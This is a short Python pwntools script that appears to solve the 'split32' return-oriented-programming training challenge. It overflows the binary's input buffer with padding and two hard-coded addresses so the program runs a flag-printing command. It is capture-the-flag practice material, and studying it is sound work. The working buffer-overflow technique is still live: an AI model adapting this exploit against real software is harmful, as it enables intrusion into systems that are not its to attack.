#!/usr/bin/python

from pwn import *
import struct
context.log_level = 'debug'


#e = ELF('./split32') # Dump some useful info about the binary

##Search for some useful locations in memory
#for address in e.search('flag.txt'):
#    print "memory location of string 'cat flag.txt':"
#    print hex(address)


#REMOTE:
#r=remote('127.0.0.1',80)

#LOCAL:
r=process('./split32')

r.recvuntil('>')

exploit = "A"*40 + "B" * 4 + "\x57\x86\x04\x08" + "\x30\xa0\x04\x08"
#exploit = ""
#exploit += "A" * 40
#exploit += "B" * 4
#exploit += struct.pack("<Q", 0x08048657)
#exploit += struct.pack("<Q", 0x0804a030)

r.sendline(exploit)

r.recvline()

#r.interactive() #Use this to go into interactive mode with the called binary
#r.send("This also sends a string") # Send a string with no newline
